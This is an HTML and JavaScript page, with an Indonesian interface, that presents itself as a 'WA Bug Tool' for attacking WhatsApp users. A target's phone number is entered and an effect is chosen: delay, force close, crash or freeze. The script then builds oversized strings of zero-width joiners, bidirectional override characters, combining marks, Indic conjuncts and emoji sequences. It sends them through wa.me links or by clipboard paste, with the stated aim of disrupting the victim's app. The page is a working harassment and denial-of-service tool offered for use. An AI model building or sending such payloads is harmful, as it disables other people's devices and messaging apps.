<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1">
<title>kenzhi Bug Tool</title>
<style>
:root{--bg:#0a0e12;--fg:#d8e4f0;--dim:#5a6a7a;--hot:#ff3b6b;--ok:#00e08a;--warn:#ffb020;--line:#1a2530}
*{box-sizing:border-box;margin:0;padding:0;-webkit-tap-highlight-color:transparent}
body{font:14px/1.5 -apple-system,Roboto,system-ui,sans-serif;background:var(--bg);color:var(--fg);
     min-height:100vh;padding:20px}
.wrap{max-width:560px;margin:0 auto}
h1{font-size:16px;letter-spacing:.15em;color:var(--hot);margin-bottom:6px;text-transform:uppercase}
.sub{color:var(--dim);font-size:12px;margin-bottom:18px}
.card{background:#0f151c;border:1px solid var(--line);border-radius:10px;padding:16px;margin-bottom:12px}
.card h2{font-size:11px;letter-spacing:.14em;color:var(--dim);text-transform:uppercase;margin-bottom:10px}
.field{margin-bottom:12px}
.field label{display:block;font-size:11px;color:var(--dim);margin-bottom:5px;text-transform:uppercase}
.field input,.field select{width:100%;background:#070a0e;border:1px solid var(--line);color:var(--fg);
       padding:10px 12px;border-radius:6px;font:inherit;outline:none}
.field input:focus,.field select:focus{border-color:var(--hot)}
.field input::placeholder{color:#3a4a5a}
.grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(150px,1fr));gap:8px}
.bug{padding:12px 10px;background:#070a0e;border:1.5px solid var(--line);border-radius:8px;
     cursor:pointer;text-align:center;transition:.12s;font-size:12.5px;font-weight:600}
.bug:hover{border-color:var(--ok);color:var(--ok)}
.bug.sel{border-color:var(--hot);background:#1a0a10;color:var(--hot);box-shadow:0 0 0 3px rgba(255,59,107,.12)}
.bug .tag{display:block;font-size:9.5px;color:var(--dim);margin-top:4px;font-weight:400;line-height:1.3}
.bug.sel .tag{color:#ff8aa8}
button{width:100%;padding:13px;border:0;border-radius:8px;background:var(--hot);color:#fff;
       font:inherit;font-weight:700;cursor:pointer;transition:.12s;letter-spacing:.04em}
button:active{opacity:.85}
button:disabled{opacity:.4;cursor:not-allowed}
button.sec{background:transparent;border:1.5px solid var(--line);color:var(--fg);margin-top:8px}
.log{background:#070a0e;border:1px solid var(--line);border-radius:8px;padding:12px;
     font:11.5px/1.55 ui-monospace,monospace;height:220px;overflow:auto;white-space:pre-wrap}
.log .in{color:var(--dim)}
.log .ok{color:var(--ok)}
.log .err{color:var(--hot)}
.log .warn{color:var(--warn)}
.intensity{display:flex;gap:8px}
.intensity div{flex:1;padding:8px;text-align:center;font-size:11px;border:1.5px solid var(--line);
               border-radius:6px;cursor:pointer;transition:.12s}
.intensity div.on{border-color:var(--warn);color:var(--warn);background:#1a1405}
.info{font-size:11px;color:var(--dim);margin-top:10px;line-height:1.6}
.info b{color:var(--fg)}
</style>
</head>
<body>
<div class="wrap">
  <h1>WA Bug Tool</h1>
  <p class="sub">Pilih efek yang dirasain korban</p>

  <div class="card">
    <h2>Target</h2>
    <div class="field">
      <label>Nomor (62xxx)</label>
      <input id="target" type="tel" inputmode="numeric" placeholder="6281234567890">
    </div>
    <div class="field">
      <label>Intensitas</label>
      <div class="intensity" id="intensity">
        <div data-i="1">Ringan</div>
        <div data-i="2" class="on">Sedang</div>
        <div data-i="3">Berat</div>
        <div data-i="4">Maksimal</div>
      </div>
    </div>
  </div>

  <div class="card">
    <h2>Jenis Bug</h2>
    <div class="grid" id="bugGrid">
      <div class="bug sel" data-bug="delay">Delay<span class="tag">pesan lemot</span></div>
      <div class="bug" data-bug="force">Force Close<span class="tag">paksa tutup</span></div>
      <div class="bug" data-bug="crash">Crash<span class="tag">app mati</span></div>
      <div class="bug" data-bug="freeze">Freeze<span class="tag">layar hang</span></div>
      <div class="bug" data-bug="delayhard">Delay Hard<span class="tag">lemot parah</span></div>
    </div>
  </div>

  <div class="card">
    <h2>Eksekusi</h2>
    <button id="btnSend" disabled>Kirim ke Target</button>
    <button id="btnTest" class="sec">Test ke Diri Sendiri</button>
    <button id="btnPreview" class="sec">Preview / Analisa</button>
  </div>

  <div class="card">
    <h2>Log</h2>
    <div class="log" id="log"></div>
  </div>

  <div class="info">
    Efektivitas tergantung versi WA target dan RAM device. Test dulu ke diri sendiri.
  </div>
</div>

<script>
/* ============================================================
   INTENSITY
   ============================================================ */
let intensity = 2;
document.querySelectorAll('#intensity div').forEach(d => {
  d.addEventListener('click', () => {
    document.querySelectorAll('#intensity div').forEach(x => x.classList.remove('on'));
    d.classList.add('on');
    intensity = parseInt(d.dataset.i, 10);
    log(`intensitas: ${d.textContent} (×${intensity})`, 'in');
  });
});

/* ============================================================
   PAYLOAD — 5 efek
   ============================================================ */
const N = n => Math.max(1, Math.floor(n * intensity));

const PAYLOADS = {
  // DELAY — pesan lemot, UI scroll tersendat
  delay: () => {
    let s = '';
    s += '‍️'.repeat(N(800));          // ZWJ + VS16
    s += '\u200B'.repeat(N(1200));     // ZWSP
    s += '\u0301'.repeat(N(600));      // combining acute
    return s + '⏳ delay';
  },

  // FORCE CLOSE — app tutup paksa
  force: () => {
    let s = '\uFEFF';                                   // BOM
    s += '\u200D'.repeat(N(1500));                      // ZWJ
    s += '\u200B'.repeat(N(1500));                      // ZWSP
    s += '\u202E'.repeat(N(800));                       // RTL override
    s += '️'.repeat(N(1000));                           // VS16
    s += '\u2066\u2069'.repeat(N(800));                 // bidi isolate
    return s + '⚠ force close';
  },

  // CRASH — app mati / restart
  crash: () => {
    let s = '';
    s += 'ৌ'.repeat(N(1200));            // Bengali conjunct
    s += '्'.repeat(N(1200));            // Devanagari virama
    s += 'க்ஷ'.repeat(N(800));           // Tamil conjunct
    s += 'ශ්‍රී'.repeat(N(800));          // Sinhala conjunct
    s += 'ॐ'.repeat(N(600));             // Devanagari OM
    return s + '☠ crash';
  },

  // FREEZE — layar hang, ANR
  freeze: () => {
    let s = '';
    s += '\u202E\u2066'.repeat(N(500));         // bidi override + LRI
    s += '‮'.repeat(N(1500));                   // RTL mark
    s += '\u200F\u200E'.repeat(N(1000));        // RLM + LRM
    s += '👨‍👩‍👧‍👦'.repeat(N(1000));         // family emoji ZWJ
    s += '\u2066\u2067\u2068'.repeat(N(500));   // nested isolate
    return s + '\u202C ❄ freeze';
  },

  // DELAY HARD — lemot parah, hampir freeze
  delayhard: () => {
    let s = '';
    s += '‍️'.repeat(N(2500));          // ZWJ + VS16 massive
    s += '\u200B'.repeat(N(3000));     // ZWSP massive
    s += '\u0300\u0301\u0302\u0303'.repeat(N(1500)); // combining chain
    s += '\u200D'.repeat(N(2000));     // ZWJ tanpa base
    s += '⏳'.repeat(N(800));
    return s + '🐌 DELAY HARD';
  },
};

/* ============================================================
   UI
   ============================================================ */
let selectedBug = 'delay';
const target = document.getElementById('target');
const btnSend = document.getElementById('btnSend');

document.querySelectorAll('.bug').forEach(el => {
  el.addEventListener('click', () => {
    document.querySelectorAll('.bug').forEach(b => b.classList.remove('sel'));
    el.classList.add('sel');
    selectedBug = el.dataset.bug;
    log(`efek dipilih: ${el.firstChild.textContent.trim()}`, 'in');
  });
});

target.addEventListener('input', () => {
  btnSend.disabled = target.value.replace(/\D/g, '').length < 8;
});

function log(msg, cls = 'in') {
  const el = document.getElementById('log');
  const d = document.createElement('div');
  d.className = cls;
  d.textContent = msg;
  el.appendChild(d);
  el.scrollTop = el.scrollHeight;
}

/* ============================================================
   PREVIEW
   ============================================================ */
document.getElementById('btnPreview').addEventListener('click', () => {
  const p = PAYLOADS[selectedBug]();
  const cps = [...p];
  log(`--- ${selectedBug} (×${intensity}) ---`, 'warn');
  log(`UTF-16 length: ${p.length}`, 'in');
  log(`codepoints: ${cps.length}`, 'in');
  log(`bytes UTF-8: ${new Blob([p]).size}`, 'in');
  log(`unique codepoints: ${new Set(cps.map(c => c.codePointAt(0))).size}`, 'in');
  log(`--- end ---`, 'warn');
});

/* ============================================================
   TEST
   ============================================================ */
document.getElementById('btnTest').addEventListener('click', () => {
  const p = PAYLOADS[selectedBug]();
  const enc = encodeURIComponent(p);
  if (enc.length > 1800) {
    log(`payload ${enc.length} URL chars — pakai clipboard`, 'warn');
    navigator.clipboard.writeText(p).then(() =>
      log('✓ payload di clipboard, paste di WA Web', 'ok')
    ).catch(() => log('clipboard diblokir', 'err'));
    window.open('https://web.whatsapp.com', '_blank');
    return;
  }
  window.open(`https://wa.me/?text=${enc}`, '_blank');
  log(`test dibuka (${p.length} chars)`, 'ok');
});

/* ============================================================
   SEND
   ============================================================ */
btnSend.addEventListener('click', async () => {
  const number = target.value.replace(/\D/g, '');
  const p = PAYLOADS[selectedBug]();
  const enc = encodeURIComponent(p);

  log(`>>> kirim ${selectedBug} (×${intensity}) ke ${number}`, 'ok');
  log(`payload ${p.length} chars / ${enc.length} URL`, 'in');

  if (enc.length > 1800) {
    log('URL terlalu panjang — mode clipboard', 'warn');
    try {
      await navigator.clipboard.writeText(p);
      log('✓ payload di clipboard', 'ok');
    } catch {
      log('clipboard error — copy manual dari preview', 'err');
      return;
    }
    window.open(`https://wa.me/${number}`, '_blank');
    log('WA tab dibuka — paste (Ctrl+V), kirim', 'warn');
    return;
  }

  window.open(`https://wa.me/${number}?text=${enc}`, '_blank');
  log('tab dibuka — klik kirim di WA', 'ok');
});

/* ============================================================
   INIT
   ============================================================ */
log('tool ready', 'ok');
log('pilih efek, atur intensitas, test dulu', 'in');
</script>
</body>
</html>
